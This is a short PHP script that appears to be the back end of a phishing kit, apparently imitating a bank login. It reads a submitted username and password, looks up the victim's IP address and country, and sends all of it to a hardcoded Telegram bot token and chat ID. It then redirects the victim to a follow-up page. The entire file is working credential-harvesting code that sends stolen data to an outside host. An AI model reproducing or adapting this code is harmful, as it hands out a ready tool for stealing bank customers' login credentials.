<?php
session_start();

$token = '7490119561:AAGJmnLToplJQ3FamNGMU6RKVSnSqsQ5g9c';
$chat_id = "5157616506";
$website = "https://api.telegram.org/bot$token";

if (isset($_POST["usuario"]) && isset($_POST["cpass"])) {
    $dni = trim($_POST["usuario"]);
    $cpass = trim($_POST["cpass"]);
    
    // Guardar el usuario en la sesión
    $_SESSION["usuario"] = $dni;

    // Obtener IP del cliente
    $ip = $_SERVER["REMOTE_ADDR"];
    $ch = curl_init("http://ip-api.com/json/$ip");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $ip_data = json_decode(curl_exec($ch), true);
    curl_close($ch);

    $country = $ip_data["country"] ?? "Desconocido";
    $ip = $ip_data["query"] ?? $ip;

    // Armar y enviar mensaje a Telegram
    $msg = "BCRs 📲\n📧 Usuario: $dni\n🔑 Clave: $cpass\n=============================\n📍 País: $country\n📍 IP: $ip\n==========================\n";
    $url = "$website/sendMessage?chat_id=$chat_id&parse_mode=HTML&text=" . urlencode($msg);
    file_get_contents($url);

    // Redireccionar a conffrm.php
    header("Location: conffrm.php");
    exit;
}
?>
